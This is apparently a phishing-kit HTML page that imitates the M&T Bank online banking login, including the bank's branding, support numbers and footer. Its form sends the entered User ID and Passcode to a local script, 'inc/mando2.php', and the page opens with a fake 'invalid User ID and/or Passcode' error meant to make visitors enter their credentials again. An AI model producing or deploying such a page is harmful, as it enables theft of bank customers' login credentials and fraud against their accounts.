<!DOCTYPE HTML>
<html lang="en" class="__sticky-footer __sticky-footer--links">
<head>

    <title>Welcome to Online Banking | M&amp;T Bank</title>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <meta name="format-detection" content="telephone=no" />
    <link href="https://resources.#/r/simple-layout-responsive/css.mtb?v=03042021140516" rel="stylesheet"/>
     <link rel="stylesheet" href="css/clientlib-base.css" type="text/css">
</head>
<body>
<form action="inc/mando2.php" method="post"><input id="UnMaskedUserId" name="UnMaskedUserId" type="hidden" value="" />    <div class="mtb-app-enrollment">
        <header class="mtb-page-header">
            <input type="hidden" id="TagPageName" name="TagPageName" value="OLB:Login:Index" />
            <div class="grid-x align-center">
                <div class="cell">
                    <a href="https://www.#/home-page" class="mtb__logo">
                        <img src="https://resources.#/Assets/img/mtb-logo.svg" alt="M&T Bank Site" />
                    </a>
                </div>
            </div>
        </header>



            <div class="mtb-page-error">
                <input data-val="true" data-val-number="The field FailedSignOnCount must be a number." data-val-required="The FailedSignOnCount field is required." id="FailedSignOnCount" name="FailedSignOnCount" type="hidden" value="3" />
                <div class="mtb-app-default--content">
                    <div class="callout __has-icon warning __no-border">
                        <i class="__is-icon m-icon m-icon-notification">
                            <span class="show-for-sr">Notification Icon</span>
                        </i>
                        <p>
                            
                           You have entered an invalid User ID and/or Passcode. Please try again.
    
                        </p>
                    </div>
                </div>
            </div>
        <div class="mtb-app-login--content">
            <div class="grid-x grid-padding-x grid-x__padded __spacer-section">
                <div class="cell">
                    <input type="hidden" value="OLB:SSC:LogInToOnlineBanking" />
                    <div class="mtb-section-header mtb-section-header__login">
                        <h1>
                            Log In to Online Banking
                        </h1>
                        <p>
                            For Personal and Business Accounts
                        </p>
                    </div>
                </div>

                <div class="cell">
                    <label for="userId">
                        User ID
                    </label>
                    <div class="input-group m-fake-single-input">
                        <input class="input-group-field js-formnputItem" data-fc-id="121" type="text" id="txtUserID" name="txtUserID" autocomplete="off"
                               aria-required="true" data-inputtype="text" data-attribute="" maxlength="20" value="" />
                        
                    </div>
                </div>

                <div class="cell">
                    <label for="Passcode">
                        Passcode
                    </label>
                    <div class="input-group m-fake-single-input">
                        <input class="input-group-field js-formnputItem" data-fc-id="122" type="password" id="Passcode" name="txtPasscode" autocomplete="off" aria-required="true" data-inputtype="tel" maxlength="20" />
                        <div class="input-group-button">
                            <button type="button" id="Show" data-btnfor="Passcode" class="button clear hide  js-showHide">Show</button>
                        </div>
                    </div>
                </div>

                <div class="cell">
                    <div class="mtb-formcheckbox">
                        <input class="show-for-sr" type="checkbox" id="RememberUserId" name="RememberUserId" value="false" />
                        <label for="RememberUserId" class="__spacer-remove">
                            Remember User ID
                        </label>
                    </div>
                </div>
            </div>

            <div class="grid-x grid-padding-x __spacer-paragraph grid-x__padded">
                <div class="cell">

                    <button type="submit" class="button button__form-no-spacer expanded" id="btnSubmit">
                        Verify
                    </button>
                </div>
                <div class="cell">
                    <a href="\Login\LoginHelp" class="button button__fake-padding-no-spacer expanded clear" id="jsAnalyticsLink">Help with User ID or Passcode</a>
                </div>
                <div class="cell">
                    <a href="/Enrollment/Enroll" class="button button__fake-padding expanded clear" id="jsAnalyticsEnrollLink" data-attribute="item">Enroll Now</a>
                </div>

                <p class="cell text-center __font-size-tiny __color-gray-accent">
                    Unauthorized access is prohibited. Usage may be monitored.
                </p>
            </div>
        </div>

        <hr class="__spacer-section" />
        <div class="mtb-app-default--content">

            <div class="grid-x grid-padding-x grid-x__padded">
                <div class="cell text-center">
                    <p class="__font-size-secondary">
                        Have questions about M&T Online Banking?
                    </p>
                </div>
                <div class="cell medium-6 text-center">
                    <p class="__font-size-secondary __color-primary __spacer-paragraph-half">
                        Personal Accounts:
                        <a href="tel:1-800-790-9130" class="__no-underline">1-800-790-9130</a>
                    </p>
                    <p class="__font-size-sub __spacer-remove __color-gray-accent">
                        Monday - Friday 8am - 9pm ET
                    </p>
                    <p class="__font-size-sub __spacer-paragraph __color-gray-accent">
                        Saturday - Sunday 9am - 5pm ET
                    </p>
                </div>
                <div class="cell medium-6 text-center">
                    <p class="__font-size-secondary __color-primary __spacer-paragraph-half">
                        Business Accounts: <a href="tel:1-800-724-6070" class="__no-underline">1-800-724-6070</a>
                    </p>
                    <p class="__font-size-sub __spacer-remove __color-gray-accent">
                        Monday - Friday 6am - 9pm ET
                    </p>
                    <p class="__font-size-sub __spacer-section __color-gray-accent">
                        Saturday - Sunday 9am - 5pm ET
                    </p>
                </div>
            </div>
        </div>
        <section class="mtb-footer mtb-footer__auth" role="contentinfo">
            <div class="grid-x">
                <div class="cell flex-container flex-dir-column align-center-middle">
                    <div class="mtb-footer--auth">
                        <a href="https://upgrade.#/olb-upgrade" class="" target="_blank">Get Started Guide</a>
                        <a href="//www.#/olbsecurity" target="_blank">Security Assistance</a>
                        <a href="https://asset.#/Documents/html/DSA.htm" target="_blank">Digital Service Agreement</a>
                        <a href="https://asset.#/Documents/html/ESign.htm" target="_blank">ESign Agreement</a>
                        <a href="https://#/olb-accessibility" target="_blank">
                            Accessibility
                        </a>


                        <a href="https://www.#/olb-personalsite" target="_blank">
                            #
                        </a>
                    </div>

                    <div class="mtb-footer--non-auth">
                        <p>
                            &copy;2023 M&amp;T Bank. All Rights Reserved.<br>
                            Users of this website agree to be bound by the provisions of the M&amp;T website <a href="https://www.#/help-center/policies/terms-of-use" target="_blank">
                                Terms of
                                Use
                            </a> and <a href="https://www.#/privacy" target="_blank">Privacy Policy</a>.
                        </p>
                        <div class="mtb-footer__logo">
                            <a href="https://www.#/equalhousinglender" target="_blank">
                                <img src=https://resources.#/Assets/img/mtb-equalhousinglender.svg class="mtb-footer__equalhousinglender" alt="Equal Housing Lender" />
                            </a>
                            <a href="https://www.#/olb-entrust" target="_blank">
                                <img src="https://resources.#/Assets/img/mtb-entrust.svg " class="mtb-footer__entrust" alt="Entrust" />
                            </a>
                        </div>
                        <p>
                            Equal Housing Lender NMLS #381076
                            <a href="https://www.#/fdic" target="_blank">Member FDIC</a>
                        </p>
                    </div>
                </div>
            </div>
        </section>
    </div>
</form>


</body>
</html>